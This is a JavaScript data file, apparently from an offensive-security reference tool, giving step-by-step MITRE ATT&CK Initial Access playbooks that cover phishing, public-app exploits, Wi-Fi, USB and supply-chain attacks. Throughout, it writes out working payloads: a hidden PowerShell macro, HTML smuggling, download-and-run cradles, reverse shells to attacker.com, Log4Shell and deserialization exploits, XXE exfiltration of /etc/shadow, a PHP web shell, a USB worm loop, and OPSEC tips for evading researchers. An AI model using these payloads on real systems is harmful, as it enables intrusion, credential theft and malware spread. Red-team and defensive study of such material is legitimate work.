export const INITIAL_ACCESS = {
  id: "initial-access",
  name: "Initial Access",
  tacticId: "TA0001",
  subtitle: "Phishing • Spearphish via Service • Drive-by • Exploit Public Apps • API Exploitation • BOLA/IDOR • GraphQL • Valid Accounts • Supply Chain • Trusted Relationships • Hardware Additions • Content Injection • Cloud Federation • Wi-Fi",
  color: "#fb923c",
  techniques: [
    {
      name: "Phishing",
      id: "T1566",
      summary: "Spearphish • attachment • link • voice • SMS",
      description: "Send phishing messages with malicious attachments or links to gain initial access",
      tags: ["spearphish", "macro", "HTML smuggling", "T1566"],
      steps: [
        "Step 1 — Build pretext from recon:\n# Effective pretexts mirror real business context:\n# Finance target → invoice dispute, PO approval, audit document\n# IT staff → password reset, MFA re-enrollment, patch advisory\n# HR targets → benefits update, onboarding form, policy acknowledgment\n# Use employee names, org details, and known projects from LinkedIn/OSINT\n# The more specific the lure, the higher the click rate",
        "Step 2 — Malicious Office document with VBA macro:\n> Sub AutoOpen()   ' Triggers automatically on document open\n>     Dim ps As String\n>     ps = \"powershell -w hidden -ep bypass -enc BASE64PAYLOAD\"\n>     Shell ps\n> End Sub\n# -w hidden: no visible PowerShell window spawned\n# BASE64PAYLOAD: base64-encoded download cradle (IEX WebClient)\n# Sign macro with stolen/purchased code-signing cert to increase trust level\n# Modern orgs block macros by default — use ISO/LNK (step 4) as primary vector",
        "Step 3 — HTML smuggling to bypass SEG/AV gateways:\n# Gateway scans the attachment/URL at delivery time — HTML smuggling builds payload AFTER delivery\n> <script>\n>   const blob = new Blob([atob('BASE64_PAYLOAD')], {type: 'application/octet-stream'});\n>   const a = document.createElement('a');\n>   a.href = URL.createObjectURL(blob);  // Created in browser memory — not scanned\n>   a.download = 'invoice_Q4.exe';\n>   document.body.appendChild(a); a.click();\n> </script>\n# Target receives an HTML file (often not scanned), payload assembled in browser\n# Variants: EvilCorp dropper, noCry, Smuggler tools",
        "Step 4 — ISO/LNK container (bypass Mark-of-the-Web):\n# Files downloaded from internet get Zone.Identifier ADS tag (MoTW)\n# MoTW triggers SmartScreen check on execution — ISO mounts DON'T propagate MoTW to contents\n# Package: payload.exe + shortcut.lnk inside ISO\n$ mkisofs -o lure.iso -r -J payloads/\n# LNK target: powershell.exe, args: -w h -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/sh')\n# User mounts ISO → double-clicks LNK → payload runs without SmartScreen warning",
        "Step 5 — Deploy phishing infra and track delivery:\n$ gophish  # Access dashboard: https://127.0.0.1:3333\n# Configure: SMTP relay, sender profile, email template, landing page, target list\n$ tail -f /opt/gophish/gophish.log | grep 'Clicked Link\\|Submitted Data'\n# Monitor C2 listener for incoming beacon connections\n# After first beacon: immediately enumerate, establish persistence, dump creds\n# Windows targets: establish C2 before AV quarantine kicks in (often 30-120s)"
      ]
    },
    {
      name: "Exploit Public-Facing Application",
      id: "T1190",
      summary: "SQLi • RCE • Log4Shell • ProxyShell • Citrix • VPN CVEs • SSRF • XXE • Deserialization",
      description: "Exploit vulnerabilities in internet-facing applications for initial access — web apps, VPNs, mail servers, firewalls, and cloud-exposed services",
      tags: ["SQLi", "RCE", "Log4Shell", "ProxyShell", "SSRF", "XXE", "deserialization", "T1190"],
      steps: [
        "Enumerate and fingerprint all public-facing attack surface:\n$ subfinder -d target.com -all -o subs.txt && httpx -l subs.txt -o live.txt\n$ cat live.txt | nuclei -t technologies/ -t exposures/ -t misconfiguration/ -severity critical,high,medium -o nuclei.txt\n$ whatweb -i live.txt -a 3 --log-verbose=whatweb.txt\n$ cat live.txt | waybackurls | uro | grep -E '\\.(php|asp|aspx|jsp|do|action)' | sort -u\n# Map: web apps, admin portals, APIs, VPN endpoints, mail servers, login panels\n# Identify: CMS versions, framework headers, exposed /.git, /.env, /swagger, /actuator",
        "SQL Injection — detection to OS shell:\n$ sqlmap -u 'https://target.com/app?id=1' --dbs --batch --random-agent --level=5 --risk=3\n$ sqlmap -u 'https://target.com/app?id=1' --dbms=mssql --os-shell --batch\n# MSSQL: xp_cmdshell for OS commands (requires sa or sysadmin)\n# MySQL: INTO OUTFILE to write webshell to web root\n$ sqlmap -u 'https://target.com/app?id=1' --file-write=shell.php --file-dest=/var/www/html/shell.php\n# Blind SQLi: time-based (SLEEP), boolean-based, out-of-band (DNS/HTTP)\n$ sqlmap -u 'https://target.com/app' --data='user=admin&pass=test' -p user --technique=BTEU\n# Manual MSSQL stacked query OS exec:\n# ' ; EXEC xp_cmdshell 'powershell -enc BASE64' --",
        "Log4Shell (CVE-2021-44228) — full exploitation chain:\n# Affects Log4j 2.0-beta9 through 2.14.1\n# Inject JNDI lookup in any logged field: User-Agent, X-Forwarded-For, username, etc.\n$ curl -sk 'https://target.com/login' -H 'X-Api-Version: ${jndi:ldap://attacker.com:1389/a}'\n$ curl -sk 'https://target.com/login' -d 'username=${jndi:ldap://attacker.com:1389/a}&password=x'\n$ python3 log4shell-poc.py --url https://target.com --lhost attacker.com --lport 1389\n# Set up malicious LDAP+HTTP server:\n$ python3 -m ysoserial.exploit -e CommonsCollections5 -c 'curl attacker.com/shell.sh | bash' > payload.ser\n# Use marshalsec to serve JNDI redirect:\n$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://attacker.com:8888/#Exploit'\n# Full bypass for patched versions: ${${lower:j}ndi:${lower:l}dap://attacker.com/a}\n# WAF bypass: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
        "ProxyShell — Exchange RCE chain (CVE-2021-34473/34523/31207):\n# CVE-2021-34473: Path confusion for pre-auth SSRF\n# CVE-2021-34523: Privilege escalation in Exchange PowerShell backend\n# CVE-2021-31207: Post-auth RCE via New-MailboxExportRequest\n$ python3 proxyshell.py -u https://mail.target.com -e victim@target.com\n# Manual steps:\n# 1. SSRF to autodiscover endpoint to get legacyDN\n$ curl -sk 'https://mail.target.com/autodiscover/autodiscover.json?@target.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@target.com'\n# 2. Exchange PowerShell via /powershell?X-Rps-CAT=<base64_token>\n# 3. Create malicious export request writing ASPX webshell to writable directory\n# 4. Access dropped webshell for RCE\n# ProxyNotShell (CVE-2022-41040/41082): authenticated SSRF→RCE on Exchange 2013-2019\n$ python3 proxynotshell.py -u https://mail.target.com -email user@target.com -password 'Pass123!'",
        "Citrix / Pulse Secure / Fortinet / GlobalProtect VPN exploits:\n# Citrix ADC (CVE-2019-19781) — path traversal to RCE:\n$ python3 CVE-2019-19781.py -t https://citrix.target.com -c 'id'\n$ curl -sk 'https://citrix.target.com/vpn/../vpns/cfg/smb.conf' --path-as-is\n# Pulse Secure (CVE-2019-11510) — pre-auth file read → credential dump:\n$ python3 CVE-2019-11510.py -t https://vpn.target.com --dump\n# Reads /etc/passwd and VPN session files with cleartext creds\n# Fortinet SSL-VPN (CVE-2018-13379) — pre-auth path traversal:\n$ curl -sk 'https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'\n# Parses session file for domain credentials\n# Palo Alto GlobalProtect (CVE-2024-3400) — command injection:\n$ curl -sk 'https://vpn.target.com/sslmgr' -d 'scep-profile-name=%0aid;'",
        "SSRF (Server-Side Request Forgery) exploitation:\n# Detect SSRF: supply internal/cloud URLs to outbound-capable parameters\n$ ffuf -w params.txt -u 'https://target.com/api/fetch?url=FUZZ' -mc 200\n# Payloads to test:\n# http://169.254.169.254/latest/meta-data/  (AWS IMDS v1)\n# http://metadata.google.internal/computeMetadata/v1/ (GCP, requires Metadata-Flavor: Google header)\n# http://169.254.169.254/metadata/instance (Azure IMDS)\n# Internal network sweep via SSRF:\n$ for i in $(seq 1 254); do curl -sk 'https://target.com/api/fetch?url=http://10.0.0.'$i':80' -o /dev/null -w '%{http_code} 10.0.0.'$i'\\n'; done\n# AWS IMDS credential theft:\n$ curl -sk 'https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# Returns role name → fetch role creds:\n$ curl -sk 'https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'\n# Use returned AccessKeyId/SecretAccessKey/Token with AWS CLI",
        "XXE (XML External Entity) injection:\n# Detect: find endpoints accepting XML input (SOAP, REST w/ XML, file upload parsers)\n# Classic XXE to read /etc/passwd:\n> <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>\n# Blind XXE via out-of-band (OOB) exfiltration:\n> <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>test</foo>\n# evil.dtd on attacker server:\n> <!ENTITY % file SYSTEM \"file:///etc/shadow\">\n> <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>\">\n> %eval;%exfil;\n# Test with Burp Collaborator / interactsh for blind detection:\n$ interactsh-client  # generates unique OOB domain for detection",
        "Java Deserialization RCE:\n# Identify Java apps: check for serialized data (0xACED0005 magic bytes, Content-Type: application/x-java-serialized-object)\n$ file_bytes=$(xxd -p endpoint_response | head -1) && echo $file_bytes | grep -q 'aced0005' && echo 'Serialized Java object'\n# Generate exploit payload with ysoserial:\n$ java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/shell.sh | bash' > payload.ser\n$ curl -sk https://target.com/api/endpoint -H 'Content-Type: application/x-java-serialized-object' --data-binary @payload.ser\n# Common gadget chains: CommonsCollections1-7, Spring1/2, Hibernate, Groovy\n# WebLogic (CVE-2019-2725) T3/IIOP deserialization:\n$ python3 CVE-2019-2725.py -t https://weblogic.target.com:7001 -c 'id'\n# JBoss/Jenkins remoting deserialization:\n$ java -jar ysoserial.jar CommonsBeanutils1 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | nc target.com 4447",
        "Web Application Firewall (WAF) bypass techniques:\n# Identify WAF: response headers, error page fingerprints, rate limiting behavior\n$ wafw00f https://target.com\n$ nmap --script http-waf-detect,http-waf-fingerprint target.com\n# SQLi WAF bypass: encoding, comments, case variation\n# ' OR 1=1--  →  ' /*!50000OR*/ 1=1--\n# ' UNION SELECT →  ' /*!UNION*/ /*!SELECT*/\n# Case mixing: SeLeCt, uNiOn\n# URL double-encoding: %27 → %2527\n# SQLmap with WAF bypass tamper scripts:\n$ sqlmap -u 'https://target.com/page?id=1' --tamper=space2comment,apostrophemask,between --random-agent\n# XSS WAF bypass:\n# <script>  →  <ScRiPt>, <img src=x onerror=alert(1)>, <svg/onload=alert(1)>\n# Filter bypass: <scr<script>ipt>, use HTML entities: &#x61;&#x6c;&#x65;&#x72;&#x74;\n# Path traversal bypass: ....//....// double encoding, null bytes, Unicode normalization",
        "Post-exploitation from web shell / RCE:\n# Upload webshell after file upload bypass or SSRF write:\n$ weevely generate password shell.php\n$ weevely https://target.com/uploads/shell.php password\n# Or minimal PHP shell:\n# <?php system($_GET['cmd']); ?>\n# Upgrade from webshell to full reverse shell:\n$ curl 'https://target.com/uploads/shell.php?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261\"'\n# Spawn interactive shell:\n$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# CTRL+Z → stty raw -echo; fg → reset\n# Immediately enumerate: sudo -l, uname -r, crontab -l, env, /etc/passwd\n# Check for cloud metadata, S3 buckets, RDS endpoints, internal network access"
      ]
    },
    {
      name: "Valid Accounts",
      id: "T1078",
      summary: "Default credentials • stolen creds • domain accounts • cloud",
      description: "Use legitimate account credentials obtained through prior compromise, purchase, or discovery",
      tags: ["default creds", "stolen credentials", "T1078"],
      steps: [
        "Test default credentials on discovered services:\n$ nxc smb 192.168.1.0/24 -u administrator -p 'Password123' --continue-on-success\n$ hydra -L default_users.txt -P default_pass.txt ssh://192.168.1.1\n# Common defaults: admin/admin, admin/password, admin/blank",
        "Validate purchased/breached credentials:\n$ nxc smb dc.target.com -u users.txt -p passwords.txt --continue-on-success\n$ kerbrute passwordspray -d target.com users.txt 'Summer2024!'\n# Spray one password at a time to avoid lockout",
        "Cloud account access with stolen credentials:\n$ aws sts get-caller-identity\n$ az account show\n$ gcloud auth list\n# Validate cloud credentials before use",
        "VPN access with stolen credentials:\n$ openconnect vpn.target.com -u jdoe --passwd-on-stdin\n# Or use AnyConnect GUI with stolen creds\n# VPN access gives network-level access to internal resources",
        "Establish persistence immediately after valid cred access:\n# Change passwords, add SSH keys, create backdoor accounts\n# Dump additional credentials while access is available"
      ]
    },
    {
      name: "Drive-by Compromise",
      id: "T1189",
      summary: "Watering hole • exploit kit • browser exploit • malvertising",
      description: "Compromise systems through malicious websites visited by target users",
      tags: ["watering hole", "exploit kit", "BeEF", "T1189"],
      steps: [
        "Identify watering hole targets:\n# Websites frequently visited by target employees\n# Industry-specific news sites, vendor portals, local news\n# LinkedIn activity, Twitter follows reveal targets",
        "Compromise third-party website to inject payload:\n# Exploit CMS vulnerability on target site\n# Inject malicious JS into site's assets\n# Add iframe pointing to exploit kit server",
        "Browser exploitation with BeEF:\n$ beef-xss\n# Access panel: http://127.0.0.1:3000/ui/panel\n# Hook browsers, run browser exploits, social engineer\n# Deliver payloads via BeEF commands",
        "Malvertising campaign:\n# Purchase ads on ad networks targeting specific demographics\n# Serve exploit code only to targets matching fingerprint\n# Browser + OS + language fingerprinting to target specific users",
        "OPSEC: only serve exploit to target IP ranges / user agents\n# Avoid burning exploit on sandboxes and researchers\n# Implement geofencing, time-limited serving"
      ]
    },
    {
      name: "External Remote Services",
      id: "T1133",
      summary: "VPN • RDP • SSH • Citrix • Pulse • Fortinet • WebVPN",
      description: "Leverage external remote access services with valid or default credentials",
      tags: ["RDP", "VPN", "SSH", "Citrix", "T1133"],
      steps: [
        "Enumerate external remote access services:\n$ nmap -p 22,3389,443,4443,8443 target.com -sV\n$ shodan search 'org:\"Target Corp\" port:3389 product:Remote'\n# Find: RDP, SSH, VPN portals, Citrix, Webex",
        "RDP brute force with valid username:\n$ hydra -l administrator -P passwords.txt rdp://192.168.1.1 -t 4\n# Low thread count to avoid lockout\n$ nxc rdp 192.168.1.0/24 -u administrator -p 'Password123'",
        "SSH access with key or password:\n$ ssh -i stolen_key.pem ubuntu@target.com\n$ ssh jdoe@target.com -p 22\n# Use stolen SSH keys from ~/.ssh on compromised hosts",
        "Citrix StoreFront / NetScaler access:\n# Navigate to https://citrix.target.com/vpn/index.html\n# Login with domain credentials\n# Access published apps and desktops",
        "Establish persistence before session expires:\n# Drop webshell, create local admin, set up reverse tunnel\n# Document all discovered resources and network layout"
      ]
    },
    {
      name: "Supply Chain Compromise",
      id: "T1195",
      summary: "Software supply chain • package poisoning • build system • SolarWinds-style",
      description: "Compromise software, hardware, or service providers to reach downstream targets",
      tags: ["supply chain", "package poisoning", "build system", "T1195"],
      steps: [
        "Identify target's software dependencies:\n$ cat requirements.txt\n$ cat package.json | jq '.dependencies'\n# Find open source packages used by target organization",
        "Typosquatting package attack:\n$ pip3 install colourama  # vs legitimate 'colorama'\n# Publish malicious package with similar name to popular package\n# Include legitimate functionality + backdoor in __init__.py",
        "Dependency confusion attack:\n# Register public package with same name as target's internal package\n# Package managers prefer public repos over private by default\n$ pip3 install target-internal-package  # resolves to attacker's public version",
        "Compromise build/CI system:\n# Target: Jenkins, GitHub Actions, CircleCI, TeamCity\n# Inject malicious step into build pipeline\n# Backdoor goes into every software release",
        "MSP/IT provider compromise for downstream access:\n# Compromise managed service provider\n# Use their RMM tools (ConnectWise, Kaseya) to deploy to clients\n# Kaseya VSA (CVE-2021-30116) - Ransomware delivery to 1500+ organizations"
      ]
    },
    {
      name: "Exploit Trusted Relationship",
      id: "T1199",
      summary: "MSP access • partner trust • third-party VPN • contractor",
      description: "Gain initial access through trusted third-party organizations with privileged access to target",
      tags: ["MSP", "trusted third-party", "contractor", "T1199"],
      steps: [
        "Identify trusted third parties with access:\n# IT managed service providers (MSPs)\n# Software vendors with remote support access\n# Contractors, consultants, auditors\n# Cloud/SaaS providers with admin access",
        "Compromise MSP or IT provider:\n# MSP has access to hundreds of clients\n# Compromise MSP RMM tool for mass deployment\n# Target MSP employees' accounts via phishing",
        "Abuse legitimate remote access tools:\n# ConnectWise Control, TeamViewer, AnyDesk\n# Used for legitimate support but abused for lateral movement\n$ nxc smb 192.168.1.0/24 -u msp_admin -p 'Password123'\n# MSP accounts often have domain admin",
        "Leverage partner network trust:\n# VPN tunnels between partner networks\n# Shared Active Directory trusts\n# API integrations with shared credentials\n# Move from partner network to target network",
        "Document trusted relationship scope:\n# What access does the third party legitimately have?\n# Are there network segmentation controls?\n# Can we escalate beyond the trusted relationship's scope?"
      ]
    },
    {
      name: "Hardware Additions",
      id: "T1200",
      summary: "USB drops • rogue AP • LAN turtle • Raspberry Pi • keylogger",
      description: "Introduce malicious hardware devices into target environments for network access or data capture",
      tags: ["USB drop", "rogue AP", "LAN Turtle", "T1200"],
      steps: [
        "USB drop attack preparation:\n# Program USB Rubber Ducky with payload\n$ python3 duckencoder.py -i payload.txt -o inject.bin\n# Or use Bash Bunny, P4wnP1, OMG cable\n# Disguise as branded USB drive (company logo)",
        "USB payload (PowerShell download-exec):\n> STRING powershell -w hidden -c IEX(New-Object Net.WebClient).downloadString('https://attacker.com/shell.ps1')\n> ENTER\n# Types payload at 1000 chars/sec, executes in seconds",
        "LAN Turtle deployment (in-line network tap):\n# Plug between target PC and wall port\n# Auto-establishes SSH reverse tunnel to attacker\n# Provides persistent network-level access from inside network",
        "Rogue access point setup:\n$ hostapd-wpe rogue_ap.conf\n# SSID matching corporate WiFi\n# Capture WPA2 Enterprise credentials (PEAP/EAP-MSCHAPv2)\n$ asleap -f capture.cap -W wordlist.txt",
        "Physical placement OPSEC:\n# Target: server rooms, empty conference rooms, under desks\n# Wear appropriate clothing, act with confidence\n# Devices should look like legitimate IT hardware"
      ]
    },
    {
      name: "Replication Through Removable Media",
      id: "T1091",
      summary: "USB worm • autorun.inf • LNK • autoplay abuse",
      description: "Spread malware via USB drives and removable media exploiting autoplay or social engineering",
      tags: ["USB worm", "autorun", "removable media", "T1091"],
      steps: [
        "Create self-spreading USB malware:\n> [autorun]\n> open=payload.exe\n> action=Open Folder\n> icon=folder.ico\n# autorun.inf auto-executes on older Windows (XP/Vista)\n# Modern Windows: relies on user double-clicking malicious LNK",
        "LNK file for modern Windows autoplay:\n> $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut('C:\\\\Resume.lnk')\n> $lnk.TargetPath = 'powershell.exe'\n> $lnk.Arguments = '-w h -c \"IEX(New-Object Net.WebClient).DownloadString(...)\"'\n> $lnk.Save()\n# Disguise as legitimate document with folder icon",
        "Copy payload to USB and wait:\n$ cp payload.exe /media/usb/\n$ cp autorun.inf /media/usb/\n# Distribute USB drops in target parking lot, lobby, bathroom",
        "USB worm propagation logic:\n> foreach ($drive in [System.IO.DriveInfo]::GetDrives()) {\n>     if ($drive.DriveType -eq 'Removable') {\n>         Copy-Item -Path $MyInvocation.MyCommand.Path -Destination \"$($drive.Name)payload.exe\"\n>     }\n> }\n# Spreads to every new USB plugged in",
        "Monitor C2 for infected hosts phoning home:\n# Air-gapped or restricted networks may only communicate via USB\n# Stuxnet-style data exfiltration via USB if no internet"
      ]
    },
    {
      name: "Wi-Fi Networks",
      id: "T1465",
      summary: "Evil twin • PMKID • PEAP cracking • Karma • WPA2 handshake • deauth • rogue AP",
      description: "Gain initial access by exploiting Wi-Fi infrastructure — cracking WPA2 PSK, abusing WPA2-Enterprise PEAP, deploying rogue access points, or positioning as an adversary-in-the-middle on wireless networks",
      tags: ["evil twin", "PMKID", "WPA2 crack", "PEAP", "rogue AP", "deauth", "T1465"],
      steps: [
        "Wireless reconnaissance — enumerate nearby networks:\n$ sudo airmon-ng start wlan0\n$ sudo airodump-ng wlan0mon\n# Capture: BSSID, ESSID, channel, encryption type, client MACs\n# Target selection: corporate SSID, WPA2-Enterprise (PEAP/EAP-MSCHAPv2), guest networks\n$ sudo airodump-ng --band abg wlan0mon  # Scan 2.4GHz + 5GHz simultaneously\n# Identify: WPA2-PSK (crackable offline), WPA2-Enterprise (requires PEAP attack), open networks\n# Document clients already associated — targets for deauth + capture",
        "WPA2-PSK attack — PMKID capture (clientless, no deauth needed):\n# Modern attack — no need to wait for a client handshake\n$ sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3\n# Wait for PMKID beacon from AP (usually seconds to minutes)\n# Convert capture for hashcat:\n$ hcxpcapngtool -o hash.hc22000 pmkid.pcapng\n# Crack with hashcat:\n$ hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt\n$ hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n# For corporate: try company name variations, season+year patterns\n$ hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?d?d?d?d  # Mask attack",
        "WPA2-PSK attack — 4-way handshake capture (with deauth):\n# Target a specific AP and channel:\n$ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n# In another terminal, deauthenticate a connected client:\n$ sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon\n# Wait for 'WPA handshake: AA:BB:CC:DD:EE:FF' in airodump window\n# Crack the handshake:\n$ hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt\n# Or use aircrack-ng:\n$ aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt\n# After cracking: connect and pivot into internal network",
        "WPA2-Enterprise (PEAP/EAP-MSCHAPv2) — rogue RADIUS with hostapd-wpe:\n# Corporate networks using 802.1X — captures NTLMv2 challenge-response hashes\n$ sudo apt install hostapd-wpe\n# Edit /etc/hostapd-wpe/hostapd-wpe.conf:\n# interface=wlan0mon\n# ssid=CorporateWiFi  (exact SSID match)\n# channel=6\n$ sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf\n# When client connects (or after deauth), captures MSCHAPv2 exchange:\n# Captured: username + challenge + response (NTLMv2 format)\n# Crack captured hash with asleap or hashcat:\n$ asleap -f hostapd-wpe.log -W /usr/share/wordlists/rockyou.txt\n$ hashcat -m 5500 'username:::challenge:response' rockyou.txt\n# MSCHAPv2 NTLMv2 → crack → get domain credentials for VPN/internal access",
        "Evil twin / Karma attack — rogue AP for credential phishing:\n# Deploy rogue AP that responds to ANY probe request (Karma)\n$ sudo apt install hostapd-karma\n# Configure evil twin AP:\n> interface=wlan0\n> ssid=Corporate-Guest\n> channel=1\n> hw_mode=g\n# Run with Karma patch — responds to all SSID probes:\n$ sudo airbase-ng -P -C 30 -e 'Corporate-Guest' -c 6 wlan0mon\n# Or use bettercap:\n$ sudo bettercap -eval \"wifi.recon on; set wifi.ap.ssid Corporate-Guest; wifi.ap on\"\n# Set up captive portal for credential capture:\n# Forward DNS → phishing page mimicking corporate SSO/O365/VPN login\n$ python3 -m http.server 80  # Serve cloned login page\n# Captured credentials: O365, VPN portal, domain credentials",
        "Deauthentication flood and client hijacking:\n# Force clients off legitimate AP, connect to rogue AP instead\n# Broadcast deauth (targets all clients on AP):\n$ sudo aireplay-ng --deauth 0 -a TARGET_BSSID wlan0mon\n# Targeted deauth (specific client):\n$ sudo aireplay-ng --deauth 100 -a TARGET_BSSID -c CLIENT_MAC wlan0mon\n# Automated deauth + capture with wifiphisher:\n$ sudo wifiphisher -aI wlan0 -jI wlan1 --essid 'Corporate-WiFi' -p oauth-login\n# -p oauth-login: OAuth2 login phishing scenario\n# wifiphisher handles: deauth → client connects to rogue → phishing page → credential capture\n# MDK4 for more aggressive deauth:\n$ mdk4 wlan0mon d -B TARGET_BSSID  # Deauth specific AP\n$ mdk4 wlan0mon d -c 6  # Deauth everything on channel 6",
        "WPS PIN attack and Pixie Dust:\n# WPS (Wi-Fi Protected Setup) vulnerable on many home/SMB routers\n# Check WPS status:\n$ sudo wash -i wlan0mon  # Lists WPS-enabled APs, locked status\n# Pixie Dust attack (offline WPS PIN cracking — works in seconds on vulnerable APs):\n$ sudo reaver -i wlan0mon -b TARGET_BSSID -c 6 -K 1 -vvv\n# -K 1: Pixie Dust mode\n# Brute-force WPS PIN (slower, 4-10 hours on non-locked):\n$ sudo reaver -i wlan0mon -b TARGET_BSSID -c 6 -vvv -N\n# After WPS PIN recovery, retrieves WPA2 PSK in plaintext\n# Use resulting PSK to authenticate to network",
        "WPA3 attacks — SAE (Dragonblood) and downgrade:\n# WPA3-Personal uses SAE (Simultaneous Authentication of Equals) — resistant to offline dictionary attacks\n# Dragonblood vulnerabilities (CVE-2019-9494/9496) — side-channel attacks on SAE handshake\n# Timing/cache side-channel leaks group used during commit frame → offline dictionary attack possible\n$ sudo python3 dragonslayer.py -i wlan0 -r TARGET_BSSID  # Dragonblood PoC\n# Downgrade attack — force WPA3 client to connect via WPA2 (if AP supports WPA2/WPA3 transition mode):\n$ sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf  # Advertise same SSID as WPA2-only\n# Client in transition mode may accept WPA2 → capture handshake → crack offline\n# WPA3-Enterprise: uses 192-bit suite — no known practical breaks\n# SAE-PK (WPA3 v2): public key pinning prevents evil twin — check if AP enforces it\n$ sudo iw dev wlan0 scan | grep -i 'RSN\\|WPA3\\|SAE\\|OWE'\n# OWE (Opportunistic Wireless Encryption) open networks: no auth but encrypted — no credential capture possible\n# Best approach vs WPA3: target transition mode APs, social engineering, supply chain on AP firmware",
        "Post-wireless-access — pivot into internal network:\n# Connect with cracked PSK:\n$ nmcli device wifi connect 'CorporateWiFi' password 'CrackedPass123'\n# Internal network access — treat same as internal foothold:\n$ nmap -sn 192.168.1.0/24 -oA wifi_sweep  # Host discovery\n$ nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt\n# Relay NTLM to SMB targets while on same segment:\n$ sudo responder -I wlan0 -dwPv\n$ sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -l loot/\n# Guest/BYOD network: look for routing to internal VLAN, misconfigured switches\n# Check: default gateway admin panel, SNMP community strings, mDNS/LLMNR traffic\n$ sudo tcpdump -i wlan0 'udp port 5353 or udp port 137'  # mDNS + NetBIOS"
      ]
    },
    {
      name: "Trusted Relationship - Cloud Federation",
      id: "T1199.cloud",
      summary: "Cloud federation • SAML trust • OAuth delegation • cross-tenant",
      description: "Abuse cloud federation and OAuth trust relationships between organizations to gain access",
      tags: ["cloud federation", "SAML", "OAuth", "cross-tenant", "T1199"],
      steps: [
        "Enumerate federated identity providers:\n$ az ad federation-credential list --id APP_ID\n$ aws iam list-saml-providers\n# Identify external identity providers trusted by the target",
        "Abuse overly permissive OAuth consent:\n# Register malicious OAuth app in attacker tenant\n# Phish target admin to grant consent (OAuth phishing)\n# Attacker app gains access to target's O365/Azure resources\n$ python3 TokenTacticsV2.py --command GetToken --ClientId YOUR_CLIENT_ID --UseDeviceCode\n# TokenTacticsV2: real tool for OAuth device code phishing\n# Tricks target admin into completing device code auth flow\n# Grants access to M365/Azure resources once authorized",
        "Cross-tenant access via managed identity:\n$ az login --federated-token $(cat $AZURE_FEDERATED_TOKEN_FILE)\n# Workload identity federation: GitHub Actions, K8s SA etc.\n# If target trusts external identity, forge the token",
        "SAML trust exploitation:\n# If IdP signing certificate is compromised (see Golden SAML)\n# Forge SAML assertions for any SP that trusts the IdP\n# Cross-organization if IdP is shared (ADFS federation with partners)",
        "AWS cross-account role assumption:\n$ aws sts assume-role --role-arn arn:aws:iam::TARGET_ACCOUNT:role/CrossAccountRole --role-session-name attack\n# If cross-account trust is misconfigured (no external ID requirement)\n# Gain access to target AWS account"
      ]
    },
    {
      name: "Exploit Public-Facing Application - API",
      id: "T1190.api",
      summary: "REST API vuln • GraphQL injection • JWT bypass • API rate abuse • BOLA",
      description: "Exploit vulnerabilities in public-facing APIs including broken object level auth, injection, and misconfiguration",
      tags: ["API exploitation", "GraphQL", "JWT bypass", "BOLA", "T1190"],
      steps: [
        "API endpoint discovery:\n$ python3 kiterunner.py brute https://api.target.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt\n$ arjun -u https://api.target.com/endpoint -m GET -T 5\n$ ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -u https://api.target.com/FUZZ -mc 200,201,301,302,400,401,403\n# Discover all API endpoints before exploitation",
        "Broken Object Level Authorization (BOLA/IDOR):\n# BOLA: change object ID in request to access others' data\n$ curl -H 'Authorization: Bearer YOUR_TOKEN' 'https://api.target.com/v1/users/1001/profile'\n# Try: 1000, 1002, 1003 — if returns other users' data = BOLA\n$ ffuf -w ids.txt -u 'https://api.target.com/api/invoices/FUZZ' -H 'Authorization: Bearer TOKEN' -mc 200\n# Automate BOLA scan across all endpoints with numeric IDs",
        "GraphQL introspection and injection:\n$ curl -s -X POST https://api.target.com/graphql -H 'Content-Type: application/json' -d '{\"query\": \"{__schema{types{name,fields{name}}}}\"}'\n# Full schema extraction via introspection\n$ python3 graphqlmap.py -u https://api.target.com/graphql --dump-via-injection\n# graphqlmap: automated GraphQL injection and mapping\n# Batch queries to bypass rate limits: {alias1: query, alias2: query}",
        "JWT algorithm confusion and forging:\n$ python3 jwt_tool.py TOKEN -X a  # Algorithm confusion: RS256→HS256\n$ python3 jwt_tool.py TOKEN -X n  # None algorithm bypass\n$ python3 jwt_tool.py TOKEN -I -hc alg -hv HS256 -pc sub -pv admin@target.com -S hs256 -p 'secret'\n# jwt_tool: full JWT attack suite\n# Obtain public key from /.well-known/jwks.json → use as HS256 secret",
